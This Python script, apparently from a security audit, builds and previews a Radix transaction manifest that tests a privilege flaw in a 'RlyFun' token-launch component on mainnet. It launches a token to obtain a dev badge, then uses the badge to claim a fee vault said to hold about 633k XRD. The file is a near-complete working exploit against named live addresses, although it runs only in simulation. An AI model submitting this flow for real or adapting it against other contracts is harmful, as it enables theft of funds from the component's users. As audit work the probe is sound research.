#!/usr/bin/env python3
"""RlyFun EarlyPump decisive test v2 (simulation only, never submitted).

Attacker flow in ONE preview:
  1. take 69 XRD (simulated attacker capital)
  2. pump.launch(...)  -> attacker becomes a dev, receives a dev badge
  3. CREATE_PROOF_FROM_BUCKET_OF_ALL on the fresh dev badge
  4. pump.claim_fee(proof)  -> does the 633k XRD fee vault pay out?
  5. deposit dev badge + claimed XRD back to the attacker
"""
import json
import sys

sys.path.insert(0, "/home/heisenberg/CA/radix-residual/analysis")
from rdx import post, ledger_state  # noqa: E402

OUT = "/home/heisenberg/CA/radix-residual/analysis/lockers_audit"
PUMP = "component_rdx1cz78ld4409v7l8nawmeqr6wj4f5nvmpzdaulwpdqg3hps56mmgzzmy"
DEV_BADGE = "resource_rdx1ng362xkr6ptkrpgww99qzhqzvwytg92ad8vxvvjzeqxa8hrt0g4ryw"
EARLY = "resource_rdx1t5xv44c0u99z096q00mv74emwmxwjw26m98lwlzq6ddlpe9f5cuc7s"
XRD = "resource_rdx1tknxxxxxxxxxradxrdxxxxxxxxx009923554798xxxxxxxxxradxrd"
ACCT = "account_rdx12xthsg9xusgcewtwszlcs5y02wwp6sl6teufwhk8hsuq3q840wajtt"

def build(fee_amount="69"):
    ls = ledger_state()
    manifest = f'''
CALL_METHOD
    Address("{ACCT}")
    "withdraw"
    Address("{XRD}")
    Decimal("{fee_amount}")
;
TAKE_ALL_FROM_WORKTOP
    Address("{XRD}")
    Bucket("fee")
;
CALL_METHOD
    Address("{PUMP}")
    "launch"
    "PROBE"
    "simulation probe"
    "PRB"
    "https://example.com/icon.png"
    "https://example.com"
    None
    Bucket("fee")
    Decimal("0.00069")
    false
;
TAKE_ALL_FROM_WORKTOP
    Address("{DEV_BADGE}")
    Bucket("dev")
;
CREATE_PROOF_FROM_BUCKET_OF_ALL
    Bucket("dev")
    Proof("devproof")
;
CALL_METHOD
    Address("{PUMP}")
    "claim_fee"
    Proof("devproof")
;
TAKE_ALL_FROM_WORKTOP
    Address("{XRD}")
    Bucket("claimed")
;
TAKE_ALL_FROM_WORKTOP
    Address("{EARLY}")
    Bucket("early")
;
CALL_METHOD
    Address("{ACCT}")
    "deposit_batch"
    Array<Bucket>(Bucket("dev"), Bucket("claimed"), Bucket("early"))
;
'''.strip()
    return manifest, ls


if __name__ == "__main__":
    manifest, ls = build()
    r = post("/transaction/preview", {
        "manifest": manifest, "start_epoch_inclusive": ls["epoch"],
        "end_epoch_exclusive": ls["epoch"] + 2, "nonce": 8002,
        "signer_public_keys": [],
        "flags": {"use_free_credit": True, "assume_all_signature_proofs": True,
                  "skip_epoch_check": True}})
    json.dump(r, open(f"{OUT}/rlyfun_launch_then_claim_fee_preview.json", "w"), indent=1)
    rc = r.get("receipt", {})
    print("status:", rc.get("status"))
    print("error:", str(rc.get("error_message"))[:600])
    for e in rc.get("events", []):
        nm = e["type"].get("name")
        em = e["type"]["emitter"]["entity"].get("entity_address", "")
        if nm in ("Launched", "Launch", "MintNonFungibleResourceEvent", "DepositEvent",
                  "WithdrawEvent", "Claim", "FeeClaim", "MintFungibleResourceEvent"):
            d = json.dumps(e.get("data", {}).get("programmatic_json"))
            print(nm, em[:46], d[:240])
    print("--- XRD changes ---")
    for g in r.get("resource_changes", []):
        for rr in g.get("resource_changes", []):
            if rr["resource_address"] == XRD:
                for ec in rr.get("entity_changes", []):
                    print("  ", ec.get("entity_type"), ec.get("entity_address", "")[:52],
                          ec.get("change"))
